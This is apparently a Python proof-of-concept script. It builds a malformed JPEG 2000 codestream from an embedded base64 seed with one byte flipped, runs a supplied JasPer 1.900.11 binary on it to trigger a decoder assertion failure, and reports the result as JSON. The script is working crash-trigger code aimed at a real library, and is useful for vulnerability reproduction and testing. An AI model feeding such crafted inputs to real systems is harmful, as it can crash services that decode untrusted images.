#!/usr/bin/env python3
"""Deterministic JasPer 1.900.11 JPC decoder assertion-failure PoC."""

import argparse
import base64
import json
import os
import re
import signal as signal_module
import subprocess
import tempfile
import time

# A minimal, valid 1x1 gray JPEG 2000 codestream generated by the target
# JasPer 1.900.11 encoder.  Offset 96 is the final byte of the COD segment;
# changing it from 1 to 2 makes the decoder use a reversible transform while
# the quantizer data are for an irreversible transform, tripping an assertion
# in jpc_t1cod.c:JPC_NOMINALGAIN.
SEED_B64 = (
    "/0//UQApAAAAAAABAAAAAQAAAAAAAAAAAAAAAQAAAAEAAAAAAAAAAAABBwEB/2QAJAAB"
    "Q3JlYXRvcjogSmFzUGVyIFZlcnNpb24gMS45MDAuMTH/UgAMAAAAAQAFBAQAAf9cABNA"
    "QEhIUEhIUEhIUEhIUEhIUP+QAAoAAAAAACoAAf9dABQAQEAAAAAAAAAAAAAAAAAAAAD/"
    "k4CAgICAgP/Z"
)
TRIGGER_OFFSET = 96
TRIGGER_ORIGINAL = 1
TRIGGER_VALUE = 2

MAX_CAPTURE = 4000


def build_payload():
    """Build the trigger codestream entirely in memory."""
    data = bytearray(base64.b64decode(SEED_B64))
    if len(data) <= TRIGGER_OFFSET:
        raise ValueError("embedded codestream is unexpectedly short")
    if data[TRIGGER_OFFSET] != TRIGGER_ORIGINAL:
        raise ValueError("embedded codestream has an unexpected layout")
    data[TRIGGER_OFFSET] = TRIGGER_VALUE
    return bytes(data)


def signal_name_for_returncode(returncode):
    if returncode is None or returncode >= 0:
        return None
    signum = -returncode
    try:
        return signal_module.Signals(signum).name
    except (ValueError, AttributeError):
        return f"signal {signum}"


def normalize_evidence(stderr_text):
    """Return concise, normalized evidence from decoder stderr."""
    if not stderr_text:
        return ""
    for line in stderr_text.splitlines():
        match = re.search(r"Assertion `[^']*' failed", line)
        if match:
            return match.group(0)
    return stderr_text.strip().splitlines()[-1]


def truncate(text):
    if len(text) <= MAX_CAPTURE:
        return text
    return text[:MAX_CAPTURE] + "...[truncated]"


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Trigger a deterministic JasPer JPC decoder fault."
    )
    parser.add_argument("--binary", required=True, help="path to jasper binary")
    parser.add_argument("--json-out", default=None, help="write JSON result here")
    parser.add_argument(
        "--timeout", type=float, default=300.0, help="per-run timeout in seconds"
    )
    args = parser.parse_args(argv)

    result = {
        "binary": args.binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "none", "value": "", "path": None},
        "error": None,
    }

    tmp_path = None
    try:
        if args.timeout <= 0:
            raise ValueError("--timeout must be greater than zero")

        payload_path = None
        fd, payload_path = tempfile.mkstemp(prefix="jasper-poc-", suffix=".jpc")
        tmp_path = payload_path
        with os.fdopen(fd, "wb") as handle:
            handle.write(build_payload())

        command = [
            args.binary,
            "-f",
            payload_path,
            "-t",
            "jpc",
            "-F",
            "/dev/null",
            "-T",
            "pnm",
        ]
        result["command"] = command

        start = time.monotonic()
        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        try:
            stdout_b, stderr_b = proc.communicate(timeout=args.timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout_b, stderr_b = proc.communicate()
            result["timed_out"] = True

        result["runtime_ms"] = round((time.monotonic() - start) * 1000.0)
        result["returncode"] = proc.returncode
        result["signal"] = signal_name_for_returncode(proc.returncode)
        result["stdout"] = truncate(
            (stdout_b or b"").decode("utf-8", errors="replace")
        )
        result["stderr"] = truncate(
            (stderr_b or b"").decode("utf-8", errors="replace")
        )

        evidence = normalize_evidence(result["stderr"])
        result["observable"] = {
            "kind": "stderr",
            "value": evidence,
            "path": None,
        }

        if result["returncode"] == 0 and not result["timed_out"]:
            result["error"] = (
                "target did not exhibit the expected fault "
                f"(returncode={result['returncode']})"
            )
    except Exception as exc:  # pragma: no cover - defensive reporting
        result["error"] = f"{type(exc).__name__}: {exc}"
        if result["command"] is None:
            result["command"] = [args.binary]
    finally:
        if tmp_path:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass

    payload = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as handle:
            handle.write(payload + "\n")
    else:
        print(payload)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
